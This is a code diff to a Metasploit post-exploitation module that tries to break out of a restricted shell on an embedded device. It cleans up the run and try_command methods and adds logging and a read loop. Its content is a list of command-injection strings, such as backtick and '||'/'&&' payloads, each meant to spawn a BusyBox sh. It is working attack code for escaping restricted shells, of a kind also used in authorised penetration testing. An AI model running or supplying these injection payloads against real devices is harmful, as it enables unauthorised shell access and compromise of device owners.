@@ -26,12 +26,9 @@ class Metasploit3 < Msf::Post
     )    
   end
 
-
-
-  def run
-    
+  def run    
     bfound = false
-    bfound = try_command("cat xx || sh\n","1_1") unless bfound
+    bfound = try_command("cat xx || sh\n","1_1") unless bfound    
     bfound = try_command("ping || sh\n","1_2") unless bfound
     bfound = try_command("echo `sh >> /dev/ttyp0`\n","2_1") unless bfound
     bfound = try_command("ping `sh >> /dev/ttyp0`\n","2_2") unless bfound
@@ -46,22 +43,21 @@ class Metasploit3 < Msf::Post
     bfound = try_command("ping ($sh)\n","5_3") unless bfound
     bfound = try_command("cat xx &amp;&amp; sh\n","6_1") unless bfound
     bfound = try_command("echo xx &amp;&amp; sh\n","6_2") unless bfound
-    bfound = try_command("ping &amp;&amp; sh\n","3_3") unless bfound
-    
-    if bfound == false
-      print_error("Unable to jailbreak device shell.")
-    end
-    
+    bfound = try_command("ping &amp;&amp; sh\n","3_3") unless bfound    
+    print_error("Unable to jailbreak device shell.") if !bfound
   end
   
   def try_command(param_command, method_number)
+      vprint_status("jailbreak sent: #{param_command}.")
       session.shell_write(param_command)
-      resp = session.shell_read()
-      vprint_status(resp)    
-      if ((resp.include? "BusyBox") && (resp.include? "Built-in shell"))
-        vprint_status("Done method " + method_number + ".")
-        return true
-      end  
+      (1..10).each do
+        resp = session.shell_read()
+        vprint_status("jailbreak received: #{resp}.")
+        if ((resp.include? "BusyBox") && (resp.include? "Built-in shell"))
+          vprint_status("Done method " + method_number + ".")
+          return true
+        end
+      end
       return false
   end
   
